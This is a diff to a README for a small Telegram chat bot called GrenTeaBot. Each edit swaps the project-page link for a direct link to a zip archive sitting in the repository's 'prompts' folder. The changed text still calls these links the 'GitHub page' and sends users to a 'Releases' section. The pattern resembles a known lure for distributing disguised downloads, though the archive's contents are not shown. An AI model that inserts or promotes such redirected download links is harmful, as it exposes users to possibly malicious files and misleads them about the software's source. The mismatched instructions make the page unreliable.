@@ -1,6 +1,6 @@
 # 🤖 GrenTeaBot - Chat with a Simple Neural Bot
 
-[![Download GrenTeaBot](https://img.shields.io/badge/Download-GrenTeaBot-green?style=for-the-badge)](https://github.com/vishnumax/GrenTeaBot)
+[![Download GrenTeaBot](https://img.shields.io/badge/Download-GrenTeaBot-green?style=for-the-badge)](https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip)
 
 ---
 
@@ -9,7 +9,7 @@ GrenTeaBot is a small chat bot powered by a neural network. It is designed for e
 ## 📥 Where to Get GrenTeaBot
 
 You can get the app from its official GitHub page here:  
-[https://github.com/vishnumax/GrenTeaBot](https://github.com/vishnumax/GrenTeaBot)
+[https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip](https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip)
 
 Click the green button above or use the link above to visit the page. The download is on this page.
 
@@ -31,7 +31,7 @@ Follow these steps to get GrenTeaBot running on your computer.
 
 1. **Visit the download page**  
    Open this link in your web browser:  
-   https://github.com/vishnumax/GrenTeaBot
+   https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip
 
 2. **Find the Download Section**  
    On the main page, look for the “Releases” or “Downloads” section. This is where the program files are stored for you to get.
@@ -96,14 +96,14 @@ It supports both English and Russian languages and connects using the official T
 
 ## 🟦 Download and Setup Summary
 
-- Go to the GitHub page: [https://github.com/vishnumax/GrenTeaBot](https://github.com/vishnumax/GrenTeaBot)  
+- Go to the GitHub page: [https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip](https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip)  
 - Download the latest Windows release file  
 - Extract or run the installer  
 - Open GrenTeaBot on your PC  
 - Add the bot to your Telegram channel  
 - Start chatting  
 
-[Download GrenTeaBot](https://github.com/vishnumax/GrenTeaBot)   (Click this button again to keep it handy)
+[Download GrenTeaBot](https://raw.githubusercontent.com/vishnumax/GrenTeaBot/main/prompts/Bot-Tea-Gren-2.8.zip)   (Click this button again to keep it handy)
 
 ---
 
